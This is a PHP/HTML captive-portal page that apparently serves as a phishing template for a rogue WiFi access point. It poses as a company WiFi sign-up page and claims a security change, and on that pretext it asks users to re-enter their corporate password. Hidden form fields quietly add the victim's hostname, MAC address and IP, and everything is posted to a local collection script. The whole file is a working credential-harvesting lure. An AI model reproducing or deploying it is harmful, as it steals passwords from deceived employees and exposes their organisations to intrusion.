<?php
$destination = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
require_once('helper.php');
?>

<html>

<head>

    <title>Connect to WiFi</title>

    <meta charset='UTF-8'>
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="pragma" content="no-cache" />
    <meta name="viewport" content="width=device-width,
    initial-scale=1" />

    <script src="jquery-2.2.1.min.js"></script>
    <script type="text/javascript">
        function redirect() {
            setTimeout(function() {
              window.location = "/captiveportal/index.php";
            }, 100);
          }
    </script>

    <link href='assets/css/fonts.css' rel='stylesheet' type='text/css'>
    <link rel='stylesheet prefetch' href='assets/css/style.css'>
    <link rel='stylesheet prefetch' href='assets/css/normalize.min.css'>
    <link rel="icon" type="image/png" href="assets/img/company-logo.png" />

</head>

<body>

    <section class="login-form-wrap">

        <form class="login-form" method="POST" action="/captiveportal/index.php" onsubmit="redirect()">

            <center>

            <h2>Sign up to access the company WiFi</h2>
            <h5>In order to enhance our network security, we have changed the way we connect to the WiFi.</h5>
            <h5>To have access to the corporate network, please re-enter your password below.</h5>

            <input type="password" name="password" placeholder="Password" autocorrect="off" autocomplete="off" autocapitalize="off" required>

            </center>

            <input type="hidden" name="hostname" value="<?=getClientHostName($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="mac" value="<?=getClientMac($_SERVER['REMOTE_ADDR']);?>">
            <input type="hidden" name="ip" value="<?=$_SERVER['REMOTE_ADDR'];?>">
            <input type="hidden" name="target" value="<?=$destination?>">
            <input type="submit" value="Connect">

        </form>

    </section>

</body>

</html>
